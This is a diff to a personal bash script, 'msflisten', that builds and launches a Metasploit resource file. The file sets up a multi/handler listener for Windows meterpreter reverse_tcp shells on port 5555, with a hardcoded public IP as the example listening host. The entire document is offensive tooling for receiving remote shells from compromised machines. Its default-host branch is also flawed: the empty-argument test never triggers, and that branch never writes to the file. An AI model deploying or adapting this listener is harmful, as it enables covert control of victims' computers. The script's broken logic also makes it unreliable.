@@ -6,6 +6,20 @@
 # Filename     : msflisten
 # Description  : 
 # ******************************************************
+echo eg: msflisten 120.24.159.2 64
 cd ~/mybash
-cat ls$1.rc
-msfconsole -r ls$1.rc
+echo use exploit/multi/handler > ls.rc
+if [[ $2 == '64' ]]; then
+echo set payload windows/x64/meterpreter/reverse_tcp >>ls.rc
+else
+echo set payload windows/meterpreter/reverse_tcp >>ls.rc
+fi
+if [[ $1.'x' == 'x' ]]; then
+echo set lhost 120.24.159.2 
+else
+echo set lhost $1 >>ls.rc
+fi
+echo set lport 5555 >>ls.rc
+echo run >> ls.rc
+cat ls.rc
+msfconsole -r ls.rc
